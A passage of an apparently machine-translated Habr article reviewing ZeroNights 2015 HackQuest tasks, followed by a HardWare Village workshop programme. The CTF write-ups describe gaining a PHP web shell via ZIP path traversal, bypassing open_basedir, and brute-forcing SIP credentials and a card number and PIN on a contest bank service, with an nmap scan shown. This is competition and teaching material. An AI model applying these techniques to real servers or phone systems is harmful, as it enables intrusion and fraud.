with <a href="https://github.com/ptoomey3/evilarc">github.com/ptoomey3/evilarc</a> <br>  Create a ZIP file with path traversal,  Now we've got PHP shell on content.0x3d.ru <br><br>  7. open_basedir bypass (unintended) <br>  Command line functions are disabled, we can browse any directory with DirectoryIterator: <a href="http://ahack.ru/releases/glob_wrapper_open_basedir_exploit.php.txt">ahack.ru/releases/glob_wrapper_open_basedir_exploit.php.txt</a> <br>  Btw, putenv () and mail () are not disabled <br><br>  8. Flag <br>  Remember dev.0x3d.ru?  Let's try it from the web shell: <br>  readfile ('http://dev.0x3d.ru'); </blockquote><br></div></div><br><br>  <a href="http://ahack.ru/write-ups/zeronights-hackquest-15.htm">More vraytap from Beched'a</a> <br><br><h2>  Day 5 - CRACKME </h2><br>  Classic.  We had to find the key in 3 different stages.  The first two algorithms were fairly well-known, but the third was not. <br><br>  Vrytap from sysenter - <a href="http://hackquest.zeronights.org/downloads/2015-day5-writeup_sysenter.pdf">hackquest.zeronights.org/downloads/2015-day5-writeup_sysenter.pdf</a> <br><br><h2>  Day 6 - dr.glukyne </h2><br>  The task was to break the SIP through ... SQL injection. <br>  Vraytap from dr.glukyne <br><div class="spoiler">  <b class="spoiler_title">Hidden text</b> <div class="spoiler_text">  1) We follow the link and see the main page of the Internet bank with the login form and the link to the registration. <br><br>  The welcome message as if hints that it is necessary to break some SIP service of the bank.  Yes, and in the task itself mentioned phreaking - <a href="https://en.wikipedia.org/wiki/Phreaking">en.wikipedia.org/wiki/Phreaking</a> <br>  2) We register in the interface of the Internet bank and get the card number and PIN-code. <br>  3) Look for a SIP to break: <br><br><pre> <code class="hljs vhdl">$: nmap -p <span class="hljs-number"><span class="hljs-number">5060</span></span> -T4 -A -v bank.defcon.su ..... <span class="hljs-keyword"><span class="hljs-keyword">PORT</span></span> STATE SERVICE VERSION <span class="hljs-number"><span class="hljs-number">5060</span></span>/tcp <span class="hljs-keyword"><span class="hljs-keyword">open</span></span> sip-proxy Asterisk PBX <span class="hljs-number"><span class="hljs-number">11.17</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> |_sip-methods: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO, PUBLISH, MESSAGE .......</code> </pre> <br>  Indeed, our Internet bank has a SIP service, which, like most SIPs, is available on port 5060. <br>  4) Let's try to connect to this service. <br>  After a small brut and hint, we get an account test@bank.defcon.su with the password test <br><br>  However, you need to understand what extension to call.  Asterisk has an extension s, which is used if the number <a href="http://www.voip-info.org/wiki/view/Asterisk%2Bs%2Bextension">www.voip-info.org/wiki/view/Asterisk+s+extension is</a> unknown <br>  We will call him: s@bank.defcon.su and hear a greeting from the bank, in which it becomes clear that you need to select the type of card (Mastercard or Visa), dial its number and PIN code.  If you enter the data card, which is given during registration, the call is terminated.  If you enter an incorrect PIN code, you are asked to repeat its input.  If you enter the wrong card number, then it is asked to re-enter.  So you can try to get the card number first, and then the pin code. <br>  5) Visa and Mastercard payment systems use different numbering systems: <a href="https://en.wikipedia.org/wiki/Bank_card_number">en.wikipedia.org/wiki/Bank_card_number</a> <br>  Visa numbers are possible in lengths of 13 or 16 digits, and in Mastercard only 16 digits.  The appearance of the hint once again underlines this anomaly with Visa. <br>  6) Search in the Internet for adequate SIP-clients for Python was not successful, so I had to <br>  manual Visa card numbers, which took some time.  In the process it turned out that only the last four digits of the number are being checked, which made the search much easier.  Also in the process of enumeration, the following was noticed: on the bank‚Äôs website it is indicated that the authorship of the task belongs to the groups Defcon DC7499 and 2600. However, the required number was different from 7499 and 2600. <br>  7) It turned out that the correct number is 1215. In response to its input, we get the full card number: 4556796461215 <br>  The possibility of recording a call to Jitsi was very helpful in getting the number. <br>  8) It remains to pick up the pin.  Again, remember about 7499 and 2600. And really 2600 is suitable. <br>  9) Enter the card number and pin-code in the web-muzzle and get the code to generate the flag. <br></div></div><br><br><h2>  Day 7 - mr_dawerty </h2><br>  The task was epic, the task was to support the firmware under AVR, find a vulnerability there (overflow), remotely exploit (there was a bridge from an external TCP port in uart).  First, it was necessary to steal a secret flag (which was constantly changing), then twice blinking with an LED (the participants also watched live response to their payload), then the system (on openCV) automatically opened the flag receiver and only after that the victory was accepted and counted.  The task was extended several times and four days passed instead of one. <br>  This is how it looked in our office: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/55d/19a/cb6/55d19acb66c3c5c0035c35c7330c7c06.jpg" alt="image"><br><br>  And so it looked for the participants (the broadcast was organized via ffmpeg + nginx-rtmp, it was possible to achieve a delay of 2-3 seconds) <br><img src="https://habrastorage.org/getpro/habr/post_images/e11/7f2/a6a/e117f2a6a617a5e40dfc3f6940987e98.png" alt="image"><br><br>  There will be no Vraytap yet, but there will be an analysis in the framework of a workshop on AVR at ZeroNights itself (we will try to tell about it in more detail, as a separate article). <br><br>  Once again, I want to say thanks to all the authors of the assignments, namely: <a href="https://twitter.com/aplastunov">@aplastunov</a> , <a href="https://twitter.com/w34kp455">@ w34kp455</a> , <a href="https://twitter.com/antyurin">@antyurin</a> , <a href="https://twitter.com/igc_iv">@igc_iv</a> , <a href="https://twitter.com/nkelesis">@nkelesis</a> , <a href="https://twitter.com/Lukesparamore">@Lukesparamore</a> , <a href="https://twitter.com/__ek0">__ek0</a> , <a href="https://twitter.com/090h">@ 090h</a> , <a href="https://twitter.com/nezlooy"><b>@nezlooy</b></a> , <a href="https://twitter.com/cherboff">@cherboff</a> , <a href="https://twitter.com/dark_k3y">dark_k3y</a> and Litvinov Egor. <br><br>  On this about HackQuest - all the time passed and tell about ... <br><br><h1>  HardWare Village </h1><br>  HardWare Village program for both days: <br><br>  <b>Day 1:</b> <br><ul><li>  Introduction to Hardware security, typical vulnerabilities and attacks. </li><li>  Where to begin?  Basic protocols and interfaces.  The shortest path to hardware is arduino, a quick start. </li><li>  Introduction to UART, SPI, i2C: what it is and prepare it for its 4fun &amp; profit. </li><li>  Basics of working with sniffers and logic analyzers. </li><li>  JTAG protocol: For developer and hacker. </li></ul><br><br>  <b>Day 2:</b> <br><ul><li>  Introduction to wireless technologies, typical vulnerabilities and attacks. </li><li>  RFID proximity cards - low-frequency cards, </li><li>  RFID proximity cards - high-frequency cards.  Technology, attacks, iron. </li><li>  Introduction to Software Defined Radio. </li><li>  Wireless communication channels in the civil bands.  Introduction to the protocols, the quest for hacking. </li><li>  Wi-fi security, bluetooth, zigbee. </li><li>  Opitic data channels (IR) </li></ul><br>  With all the described technologies and methods of attack will be available on practical examples. <br><br>  Recall that registration ends tomorrow at 14:00 - <a href="http://2015.zeronights.ru/registraciya.html">2015. zeronights.ru/registraciya.html</a> , the program is ready, final preparation is underway.  See you at ZeroNights 2015! </div><p>Source: <a href="https://habr.com/ru/post/271431/">https://habr.com/ru/post/271431/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../271419/index.html">PHP Digest number 74 - interesting news, materials and tools (November 5 - 22, 2015)</a></li>
<li><a href="../271421/index.html">Knowledge Testing Services [Magento Certification]</a></li>
<li><a href="../271423/index.html">The digest of interesting materials from the world of web development and IT for the last week ‚Ññ186 (November 15 - 22, 2015)</a></li>
<li><a href="../271425/index.html">How to parse the Internet in goose</a></li>
<li><a href="../271427/index.html">Automated controller testing in Rails</a></li>
<li><a href="../271433/index.html">Making the code cleaner: working with 64-bit hardware registers in Linux</a></li>
<li><a href="../271435/index.html">Light Speck block cipher, or a speck of dust from an agency that does not exist</a></li>
<li><a href="../271437/index.html">Announced the end date of support for Yii 1.1</a></li>
<li><a href="../271439/index.html">About using Visual Studio Code in Unity under OS X</a></li>
<li><a href="../271445/index.html">The digest of interesting materials from the world of Drupal # 15</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>